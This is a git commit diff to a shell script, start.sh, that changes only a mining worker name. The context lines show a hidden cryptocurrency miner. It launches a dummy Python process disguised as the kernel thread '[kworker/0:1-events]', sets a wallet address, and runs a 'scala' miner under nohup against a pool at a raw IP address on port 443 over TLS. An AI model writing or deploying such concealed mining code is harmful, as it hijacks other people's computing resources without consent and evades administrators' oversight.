f00770bc784e7b9392566cb5e8c2fc0becddb9d0
ewilkinso <ewilkinson3@alaska.edu>
2025-08-14 22:45:58 +0100

    Update start.sh

--- start.sh
+++ start.sh
@@ -3,7 +3,7 @@
 nohup python3 -c 'import time,os,sys;sys.argv[0]="[kworker/0:1-events]";[time.sleep(0.5) for _ in iter(int,1)]' >/dev/null 2>&1 &
 
 WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
-WORKER="dandi-dgreen"
+WORKER="dandidgreen"
 POOL="45.155.102.89:443"
 THREADS=
 
@@ -22,7 +22,7 @@ nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_o
 nohup python3 -c 'import time,os,sys;sys.argv[0]="[kworker/0:1-events]";[time.sleep(0.5) for _ in iter(int,1)]' >/dev/null 2>&1 &
 
 WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
-WORKER="dandi-dgreen"
+WORKER="dandidgreen1"
 POOL="45.155.102.89:443"
 THREADS=
 
